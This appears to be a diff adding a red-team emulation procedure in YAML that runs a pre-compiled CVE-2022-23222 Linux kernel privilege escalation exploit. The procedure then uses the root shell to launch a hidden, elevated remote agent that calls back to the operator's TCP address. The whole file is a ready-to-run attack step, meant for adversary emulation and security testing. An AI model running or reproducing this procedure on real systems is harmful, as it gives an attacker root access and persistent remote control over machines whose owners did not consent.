@@ -1,0 +1,29 @@
+id: 98a66759-75b7-4c98-8b5c-8b0e024ab8db
+name: Spawn elevated Pneuma via CVE-2022-23222
+description: >-
+  Executes a pre-compiled local privilege escalation exploit
+  (CVE-2022-23222) to spawn a root shell, which is then leveraged to spawn an
+  elevated Pneuma instance.
+tactic: privilege-escalation
+technique:
+  id: T1068
+  name: Exploitation for Privilege Escalation
+metadata:
+  authors:
+    - FridayOrtiz
+    - tr3ee
+  references:
+    - 'https://github.com/FridayOrtiz/CVE-2022-23222'
+    - 'https://github.com/tr3ee/CVE-2022-23222'
+    - 'https://tr3e.ee/posts/cve-2022-23222-linux-kernel-ebpf-lpe.txt'
+    - 'https://www.openwall.com/lists/oss-security/2022/01/18/2'
+  tags: []
+  payloads:
+    cve_2022_23222: 71bcc14459736dc020365c8265273b5946e67d1a
+platforms:
+  linux:
+    sh:
+      command: |-
+        cp "./cve_2022_23222" /tmp/cve_2022_23222
+        echo 'nohup #{agent.location} -address #{operator.tcp} -range elevated >/dev/null 2>&1 &' | /tmp/cve_2022_23222
+      payload: cve_2022_23222
